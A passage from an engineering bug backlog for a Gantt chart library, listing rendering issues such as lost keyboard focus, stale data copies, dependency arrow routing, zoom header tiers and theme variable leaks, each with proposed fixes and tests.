- **Problem:** The bar's keydown calls `controller.handleKeyDown`, which triggers `render()`. `render()` removes the old body, so `document.activeElement` falls back to `<body>`, and nothing restores focus. Arrow nudging works once per Tab, and keyboard and screen-reader users cannot operate the chart. Label rows and the lock button behave the same way.
- **Fix:**
  - `captureFocus()` runs before render and records `{ id, kind }` from `activeElement.closest('[data-task-id]')` inside the root. `kind` is bar, milestone, label row or lock button, derived from the class.
  - After mounting, query `[data-task-id="${CSS.escape(id)}"]` for that kind, with a manual quote-escape fallback when `CSS.escape` is missing, and call `.focus({ preventScroll: true })`.
  - This becomes a no-op once CORERENDER-12 stage 3 reuses the elements.
- **Verify:** "Renderer hardening": "keeps keyboard focus on the same task across re-renders" for a bar, a milestone and a label row (ArrowRight twice keeps `document.activeElement` on the same id).

#### [ ] CORERENDER-14 · Drag feedback is lost and hover cards are recreated or orphaned on every re-render  `medium` `bug` `effort S`
- **Where:** `packages/core/src/renderers/task-bars.ts:276`; `packages/core/src/rendering/jantt-engine.ts:182`, `:552`; `packages/core/src/theme.css:1566`
- **Problem:** The controller adds `is-dragging` to the original bar, but the next rAF render replaces that bar, so the drag style never shows. `render()` never hides the tooltip. Removed bars get no `mouseleave`, so cards stay stuck, and during a drag every rebuilt bar fires `mouseenter` again. The 60 s timer re-renders mid-hover or mid-pan and detaches the gesture's elements.

  - After render, re-apply `is-dragging` to the elements whose `data-task-id` is in the active drag set. coreinteract exposes `getDraggingTaskIds(): ReadonlySet<string>`.

- **Verify:** Engine tests:
  - A render mid-drag keeps `.is-dragging` on the dragged bar and leaves no `.jantt-hover-card` in `document.body`.
  - With fake timers, a 60 s tick on the same day does not replace `.jantt-body-wrap`.

#### [ ] CORERENDER-15 · Engine and controller keep two copies of the data; controller-side deletes and cascades are reverted by the engine  `medium` `architecture` `effort M`
- **Where:** `packages/core/src/rendering/jantt-engine.ts:215`, `:274`; `packages/core/src/controller.ts:510`, `:557` (coreinteract)
- **Problem:** Keyboard Delete and Arrow with autoCascade replace the controller's `this.data`. `onRenderRequest` then calls `engine.render()`, which lays out its own stale `currentData` and pushes it back through `controller.updateData`. That reverts the change after `onTaskDelete`/`onCommit` have already fired. Drag only works because `setTasks` mutates the aliased `this.data.tasks` array (ARCH-02).
- **Fix (engine side here, controller side in coreinteract):**
  - The engine is the single owner of the data. Pass the controller an `onDataChange(next: JanttData)` callback, a constructor option added by coreinteract. The engine handler only sets `this.currentData = next`, and the controller still requests the render.
  - coreinteract replaces every assignment to `this.data` or `this.data.tasks` (`controller.ts:217`, `:251`, `:433`, `:713` in the tree) with a new object passed to `onDataChange`, and commits afterwards.
  - The engine never relies on aliasing. `getData()` returns `currentData`, so memoizing by reference (CORERENDER-12 stage 1) becomes valid.
- **Verify:** Engine integration tests:
  - Delete keydown on a focused bar: `instance.getData()` no longer contains the task, its bar is gone, and `onCommit` fired once with that same data.
  - Arrow with autoCascade on moves the successors in `getData()`.

#### [ ] CORERENDER-16 · Dependency routing ignores SS/FF/SF anchor sides; FF/SF arrows end under the successor bar  `medium` `bug` `effort M`
- **Where:** `packages/core/src/layout.ts:307`, `:551`, `:557`
- **Problem:** For SS, `fromX` is the predecessor's left edge, yet `computeDependencyPath` always exits to the right (`fromX + 8`), straight through the bar. For FF/SF, `toX` is the successor's right edge, but the path always enters from the left, so its last segment runs across the bar (z 6, above the SVG at z 4) and hides the arrowhead. Users cannot tell link types apart.
- **Fix:**
  - New signature: `computeDependencyPath(fromX, fromY, toX, toY, rowHeight, style, fromSide: "start"|"end" = "end", toSide: "start"|"end" = "start")`. The defaults keep FS output byte-identical.
  - A start-anchored predecessor exits leftwards (`fromX - lead`). An end-anchored successor is entered from the right (`toX + lead`); the marker's `orient="auto-start-reverse"` points the arrow left.
  - When the horizontal run would cross either bar, route through the row gutter at the row boundary (`± rowHeight/2`). Apply this to every routing style.
  - `layout()` derives the sides from `rel.type`. The live link preview stays FS.
- **Verify:** `layout.test.ts` "Dependency routing by anchor side":
  - The FS path string is unchanged.
  - SS's first segment goes left.
  - FF/SF's last segment approaches from the right.
  - Every path ends exactly at its anchor, in all routing styles.

#### [ ] CORERENDER-17 · Single-day tasks are rendered as milestones, and durations disagree between grid and tooltip  `medium` `false-logic` `effort S`
- **Where:** `packages/core/src/layout.ts:203`; `packages/core/src/renderers/tooltip.ts:37`, `:54`, `:155`

- **Fix:**

  - The negative-float label becomes "Behind by Nd (negative float)".

#### [ ] CORERENDER-18 · Zoomed-out header: week and quarter tiers never rendered; per-day cells and labels overlap at 1.2-5px/day  `medium` `ux` `effort M`
- **Where:** `packages/core/src/layout.ts:41`, `:429`; `packages/core/src/renderers/timeline-header.ts:186`; `packages/core/src/renderers/timeline-grid.ts:24`; `packages/core/src/theme.css:1189`
- **Problem:** `getScaleFromDayWidth` documents week, quarter and year tiers, but `renderTimelineHeader` only draws years (multi-year spans only), months and one cell per day, and `header.weeks` is computed but never used. At quarter and year scale, about 66 px month cells render "September 2026" with `overflow:visible`, and the boundary pills overlap. One grid column with a 1 px border per 1.2 px day turns into a smear made of thousands of nodes.
- **Fix:**

    | day | months + days |
    | week | months + compact days |

    | quarter, year | years + quarters, plus short month names when a month is at least 24 px wide |

  - `layout()` computes quarters next to weeks.
  - `timeline-grid.ts` draws one column per lowest rendered tier cell, with weekends shown only at day and week scale.
  - Tier labels: `white-space:nowrap; overflow:hidden; text-overflow:ellipsis`, with short month names under a width threshold.
  - Skip a boundary marker when it would overlap the previous one (`x - lastX < minGap`).
- **Verify:**
  - `timeline-header.test.ts` "Zoom-adaptive header tiers": month scale has week cells and no day cells; quarter scale has Q cells; the grid column count equals the lowest tier's cell count.
  - Manual: the year preset is legible.

#### [ ] CORERENDER-19 · No bound on the timeline span: a plan with distant dates can freeze every viewer (DoS)  `medium` `performance` `effort S`
- **Where:** `packages/core/src/layout.ts:157`, `:184`, `:364`
- **Problem:** `chartStart`/`chartEnd` come from viewport, meta or the task min/max with no cap. `totalDays` drives per-day loops, and the renderers add a header cell and a grid column for every day. `meta.start: "1000-01-01"`, or a typo in the year, creates hundreds of thousands of nodes and hangs every viewer, again on each 60 s re-render.
- **Fix:**

  - Warn once through `console.warn` (or `onError` if present).

- **Verify:** `layout.test.ts` "Timeline bounds hardening":
  - An absurd explicit start gives `totalDays ≤ MAX`.
  - A 30-year task range is capped.
  - An invalid date gives finite bounds.

#### [ ] CORERENDER-21 · Theme switching leaves stale inline CSS variables from the previous theme  `medium` `bug` `effort S`

Pink Beenie defines `--jantt-bar-radius: 14px`, `--jantt-bar-done`, `--jantt-bar-done-subtle` and `--jantt-glass-blur`, which the other themes do not. After Beenie, every theme keeps 14 px radii and pink "done" colors.

#### [ ] CORERENDER-22 · Only light and dark theme classes define CSS variables; other theme classes and the body-mounted tooltip render with the light palette  `medium` `inconsistency` `effort M`
- **Where:** `packages/core/src/theme.css:6`, `:38`; `packages/core/src/renderers/tooltip.ts:178`

The cyber-emerald, nordic-frost, midnight-rose, sunset-crimson and beenie classes carry only component overrides, so `themeClassName` alone yields a light chart with dark-specific overrides. The tooltip is appended to `document.body`, outside the themed container, so it inherits the `:root` light variables.
- **Fix:**
  - Keep a single source of truth, the `ThemeDefinition.vars` in `themes/*.ts`.
    - The engine resolves `{...themeByClassName(themeClassName)?.vars, ...options.theme}`, looking the class up in `themeManager.getAllThemes()` by `className`.

- **Verify:** "Renderer hardening": "a built-in themeClassName alone applies that theme's tokens". The inline `--jantt-bg` on the root and on a shown hover card equals the theme's value for all 7 themes.

#### [ ] CORERENDER-25 · Infinite box-shadow and filter animations on all critical items cause continuous repaints and ignore reduced motion  `medium` `performance` `effort S`

#### [ ] CORERENDER-28 · Column-drag zoom claims to be cursor-anchored but the anchor is dropped; rAF uses a stale delta and can fire after pointerup  `low` `false-logic` `effort S`
